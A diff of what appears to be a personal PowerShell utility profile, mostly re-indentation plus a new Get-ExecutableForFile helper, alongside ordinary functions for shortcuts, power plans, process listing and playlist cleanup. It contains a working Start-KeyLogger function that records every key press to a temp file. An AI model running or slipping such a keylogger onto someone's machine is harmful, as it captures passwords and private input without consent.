@@ -1,21 +1,62 @@
+function Get-ExecutableForFile
+{
+		param
+		(
+				[Parameter(Mandatory)]
+				[string]
+				$Path
+		)
+ 
+		$Source = @"
+ 
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+public class Win32API
+		{
+				[DllImport("shell32.dll", EntryPoint="FindExecutable")] 
+ 
+				public static extern long FindExecutableA(string lpFile, string lpDirectory, StringBuilder lpResult);
+ 
+				public static string FindExecutable(string pv_strFilename)
+				{
+						StringBuilder objResultBuffer = new StringBuilder(1024);
+						long lngResult = 0;
+ 
+						lngResult = FindExecutableA(pv_strFilename, string.Empty, objResultBuffer);
+ 
+						if(lngResult >= 32)
+						{
+								return objResultBuffer.ToString();
+						}
+ 
+						return string.Format("Error: ({0})", lngResult);
+				}
+		}
+ 
+"@ 
+ 
+		Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
+		[Win32API]::FindExecutable($Path)
+}
 
 <#
 .SYNOPSIS
-    Sets a shortcut for exe file.
+		Sets a shortcut for exe file.
 .PARAMETER SourceExe
-    The known exe file path.
+		The known exe file path.
 .PARAMETER ArgumentsToSourceExe
-    The arguments.
+		The arguments.
 .PARAMETER DestinationPath
-    Shortcut location.
+		Shortcut location.
 #>
 function Set-Shorcut
 {
 	Param (
-        [string]$SourceExe,
-        [string]$ArgumentsToSourceExe,
-        [string]$DestinationPath
-    )
+				[string]$SourceExe,
+				[string]$ArgumentsToSourceExe,
+				[string]$DestinationPath
+		)
 	$WshShell = New-Object -comObject WScript.Shell
 	$Shortcut = $WshShell.CreateShortcut($DestinationPath)
 	$Shortcut.TargetPath = $SourceExe
@@ -40,8 +81,8 @@ function Set-PowerMode
 			$paca.Activate();
 		}
 
-        #$p = Get-CimInstance -Name root\cimv2\power -Class win32_PowerPlan -Filter "ElementName = 'High Performance'"
-        #Invoke-CimMethod -InputObject $p -MethodName Activate
+				#$p = Get-CimInstance -Name root\cimv2\power -Class win32_PowerPlan -Filter "ElementName = 'High Performance'"
+				#Invoke-CimMethod -InputObject $p -MethodName Activate
 	}
 }
 
@@ -55,97 +96,97 @@ function IsModulesExists
 }
 function Start-Fun
 {
-    $null = Register-ObjectEvent -InputObject ([Microsoft.Win32.SystemEvents]) -EventName "SessionSwitch" -Action {
-    Add-Type -AssemblyName System.Speech
-    $synthesizer = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer
-    switch($event.SourceEventArgs.Reason) {
-        'SessionLock'    { $synthesizer.Speak("Seeyou later $env:username!") }
-        'SessionUnlock'  { $synthesizer.Speak("Hey,welcome back $env:username!") }
-    }
-  }
+		$null = Register-ObjectEvent -InputObject ([Microsoft.Win32.SystemEvents]) -EventName "SessionSwitch" -Action {
+		Add-Type -AssemblyName System.Speech
+		$synthesizer = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer
+		switch($event.SourceEventArgs.Reason) {
+				'SessionLock'    { $synthesizer.Speak("Seeyou later $env:username!") }
+				'SessionUnlock'  { $synthesizer.Speak("Hey,welcome back $env:username!") }
+		}
+	}
 }
 
 function Stop-Fun
 {
-    $events = Get-EventSubscriber | Where-Object { $_.SourceObject -eq [Microsoft.Win32.SystemEvents] }
-    $jobs = $events | Select-Object -ExpandProperty Action
-    $events | Unregister-Event
-    $jobs | Remove-Job
+		$events = Get-EventSubscriber | Where-Object { $_.SourceObject -eq [Microsoft.Win32.SystemEvents] }
+		$jobs = $events | Select-Object -ExpandProperty Action
+		$events | Unregister-Event
+		$jobs | Remove-Job
 }
 
 function Start-Progress
 {
-  param
-  (
-    [ScriptBlock]
-    $code
-  )
+	param
+	(
+		[ScriptBlock]
+		$code
+	)
 
-  $newPowerShell = [PowerShell]::Create().AddScript($code)
-  $handle = $newPowerShell.BeginInvoke()  
+	$newPowerShell = [PowerShell]::Create().AddScript($code)
+	$handle = $newPowerShell.BeginInvoke()  
 
-  while ($handle.IsCompleted -eq $false)
-  {
-    Write-Host '.' -NoNewline
-    Start-Sleep -Milliseconds 500
-  }
+	while ($handle.IsCompleted -eq $false)
+	{
+		Write-Host '.' -NoNewline
+		Start-Sleep -Milliseconds 500
+	}
 
-  Write-Host ''  
+	Write-Host ''  
 
-  $newPowerShell.EndInvoke($handle)  
+	$newPowerShell.EndInvoke($handle)  
 
-  $newPowerShell.Runspace.Close()
-  $newPowerShell.Dispose()
+	$newPowerShell.Runspace.Close()
+	$newPowerShell.Dispose()
 }
 
 function Test
 {
-  $codetext = $Args -join ' '
-  $codetext = $ExecutionContext.InvokeCommand.ExpandString($codetext)
-  $code = [ScriptBlock]::Create($codetext)
-  $timespan = Measure-Command $code
-  "Your code took {0:0.000} seconds to run" -f $timespan.TotalSeconds
+	$codetext = $Args -join ' '
+	$codetext = $ExecutionContext.InvokeCommand.ExpandString($codetext)
+	$code = [ScriptBlock]::Create($codetext)
+	$timespan = Measure-Command $code
+	"Your code took {0:0.000} seconds to run" -f $timespan.TotalSeconds
 } 
 
 function Export-ScheduledTask
 {
-    param
-    (
-        [Parameter(Mandatory=$true)]
-        $TaskName,
-        [Parameter(Mandatory=$true)]
-        $XMLFileName
-    )
+		param
+		(
+				[Parameter(Mandatory=$true)]
+				$TaskName,
+				[Parameter(Mandatory=$true)]
+				$XMLFileName
+		)
 
-    schtasks /QUERY /TN $TaskName /XML | Out-File $XMLFileName
+		schtasks /QUERY /TN $TaskName /XML | Out-File $XMLFileName
 }
 
 function Get-ProcessEx
 {
-    param
-    (
-        $Name='*',           
-        $ComputerName,            
-        $Credential
-    )
+		param
+		(
+				$Name='*',           
+				$ComputerName,            
+				$Credential
+		)
 
-    $null = $PSBoundParameters.Remove('Name')
-    $Name = $Name.Replace('*','%')      
+		$null = $PSBoundParameters.Remove('Name')
+		$Name = $Name.Replace('*','%')      
 
-    Get-WmiObject -Class Win32_Process @PSBoundParameters -Filter "Name like '$Name'" |
-    ForEach-Object
-    {
-        $result = $_ | Select-Object Name, Owner, Description, Handle
-        $Owner = $_.GetOwner()
-        if ($Owner.ReturnValue -eq 2)
-        {
-            $result.Owner = 'AccessDenied'
-        } else
-        {
-            $result.Owner = '{0}\{1}' -f ($Owner.Domain, $Owner.User)
-        }
-        $result
-    }
+		Get-WmiObject -Class Win32_Process @PSBoundParameters -Filter "Name like '$Name'" |
+		ForEach-Object
+		{
+				$result = $_ | Select-Object Name, Owner, Description, Handle
+				$Owner = $_.GetOwner()
+				if ($Owner.ReturnValue -eq 2)
+				{
+						$result.Owner = 'AccessDenied'
+				} else
+				{
+						$result.Owner = '{0}\{1}' -f ($Owner.Domain, $Owner.User)
+				}
+				$result
+		}
 }
 
 function Get-OSVersion
@@ -224,18 +265,18 @@ function ChangebuttonAction($value)
 
 function PromptGetChoice
 {
-    #Prompt message
-    $Caption = "Restart the computer."
-    $Message = "It will take effect after restart, do you want to restart right now?"
-    $Choices = [System.Management.Automation.Host.ChoiceDescription[]]`
-    @("&Yes","&No")
-    [Int]$DefaultChoice = 0
-    $ChoiceRTN = $Host.UI.PromptForChoice($Caption, $Message, $Choices, $DefaultChoice)
-    Switch ($ChoiceRTN)
-    {
-        0 	{shutdown -t 0 -r }
-        1  	{break}
-    }
+		#Prompt message
+		$Caption = "Restart the computer."
+		$Message = "It will take effect after restart, do you want to restart right now?"
+		$Choices = [System.Management.Automation.Host.ChoiceDescription[]]`
+		@("&Yes","&No")
+		[Int]$DefaultChoice = 0
+		$ChoiceRTN = $Host.UI.PromptForChoice($Caption, $Message, $Choices, $DefaultChoice)
+		Switch ($ChoiceRTN)
+		{
+				0 	{shutdown -t 0 -r }
+				1  	{break}
+		}
 }
 
 function PromptInfo
@@ -252,33 +293,33 @@ function PromptInfo
 #requires -Version 2 
 function Show-InputBox
 {
-    [CmdletBinding()]
-    param
-    (
-        [Parameter(Mandatory=$true)]
-        [string]
-        $Prompt,
-        
-        [Parameter(Mandatory=$false)]
-        [string]
-        $DefaultValue='',
-        
-        [Parameter(Mandatory=$false)]
-        [string]
-        $Title = 'Windows PowerShell'
-    )
-    
-    
-    Add-Type -AssemblyName Microsoft.VisualBasic
-    [Microsoft.VisualBasic.Interaction]::InputBox($Prompt,$Title, $DefaultValue)
+		[CmdletBinding()]
+		param
+		(
+				[Parameter(Mandatory=$true)]
+				[string]
+				$Prompt,
+				
+				[Parameter(Mandatory=$false)]
+				[string]
+				$DefaultValue='',
+				
+				[Parameter(Mandatory=$false)]
+				[string]
+				$Title = 'Windows PowerShell'
+		)
+		
+		
+		Add-Type -AssemblyName Microsoft.VisualBasic
+		[Microsoft.VisualBasic.Interaction]::InputBox($Prompt,$Title, $DefaultValue)
 }
  
 #Show-InputBox -Prompt 'Enter your name'
 
 function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
 {
-  # Signatures for API Calls
-  $signatures = @'
+	# Signatures for API Calls
+	$signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -289,57 +330,57 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@ 
  
-  # load signatures and make members available
-  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-    
-  # create output file
-  $null = New-Item -Path $Path -ItemType File -Force
+	# load signatures and make members available
+	$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+		
+	# create output file
+	$null = New-Item -Path $Path -ItemType File -Force
  
-  try
-  {
-    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
+	try
+	{
+		Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
  
-    # create endless loop. When user presses CTRL+C, finally-block
-    # executes and shows the collected key presses
-    while ($true) {
-      Start-Sleep -Milliseconds 40
-      
-      # scan all ASCII codes above 8
-      for ($ascii = 9; $ascii -le 254; $ascii++) {
-        # get current key state
-        $state = $API::GetAsyncKeyState($ascii)
+		# create endless loop. When user presses CTRL+C, finally-block
+		# executes and shows the collected key presses
+		while ($true) {
+			Start-Sleep -Milliseconds 40
+			
+			# scan all ASCII codes above 8
+			for ($ascii = 9; $ascii -le 254; $ascii++) {
+				# get current key state
+				$state = $API::GetAsyncKeyState($ascii)
  
-        # is key pressed?
-        if ($state -eq -32767) {
-          $null = [console]::CapsLock
+				# is key pressed?
+				if ($state -eq -32767) {
+					$null = [console]::CapsLock
  
-          # translate scan code to real code
-          $virtualKey = $API::MapVirtualKey($ascii, 3)
+					# translate scan code to real code
+					$virtualKey = $API::MapVirtualKey($ascii, 3)
  
-          # get keyboard state for virtual keys
-          $kbstate = New-Object Byte[] 256
-          $checkkbstate = $API::GetKeyboardState($kbstate)
+					# get keyboard state for virtual keys
+					$kbstate = New-Object Byte[] 256
+					$checkkbstate = $API::GetKeyboardState($kbstate)
  
-          # prepare a StringBuilder to receive input key
-          $mychar = New-Object -TypeName System.Text.StringBuilder
+					# prepare a StringBuilder to receive input key
+					$mychar = New-Object -TypeName System.Text.StringBuilder
  
-          # translate virtual key
-          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
+					# translate virtual key
+					$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
  
-          if ($success) 
-          {
-            # add key to logger file
-            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
-          }
-        }
-      }
-    }
-  }
-  finally
-  {
-    # open logger file in Notepad
-    notepad $Path
-  }
+					if ($success) 
+					{
+						# add key to logger file
+						[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
+					}
+				}
+			}
+		}
+	}
+	finally
+	{
+		# open logger file in Notepad
+		notepad $Path
+	}
 }
  
 # records all key presses until script is aborted by pressing CTRL+C 
@@ -349,20 +390,20 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 function Clear-MusicFolderFromPlayLists
 {
 	[CmdletBinding()]
-  Param
-  (
-    [Parameter(mandatory=$true,ValueFromPipeline=$true)]
-    [ValidateSet('D:\\music')]
-    [string]$MusicFolderPath
-  )
-  Process 
-  {
-    $playlistsfolder = [System.IO.Path]::Combine($MusicFolderPath, "\\Playlists")
-    $templists = Get-ChildItem -Recurse -Path $MusicFolderPath | Where-Object { ($_.Extension -eq ".m3u") -and ($_.FullName  -notmatch $playlistsfolder)}
+	Param
+	(
+		[Parameter(mandatory=$true,ValueFromPipeline=$true)]
+		[ValidateSet('D:\\music')]
+		[string]$MusicFolderPath
+	)
+	Process 
+	{
+		$playlistsfolder = [System.IO.Path]::Combine($MusicFolderPath, "\\Playlists")
+		$templists = Get-ChildItem -Recurse -Path $MusicFolderPath | Where-Object { ($_.Extension -eq ".m3u") -and ($_.FullName  -notmatch $playlistsfolder)}
 	foreach ($row in $templists)
 	{
-	    #$row.FullName
+			#$row.FullName
 		Remove-Item  -LiteralPath $row.FullName -Force -ErrorAction SilentlyContinue -Verbose
 	}
-  }
+	}
 }
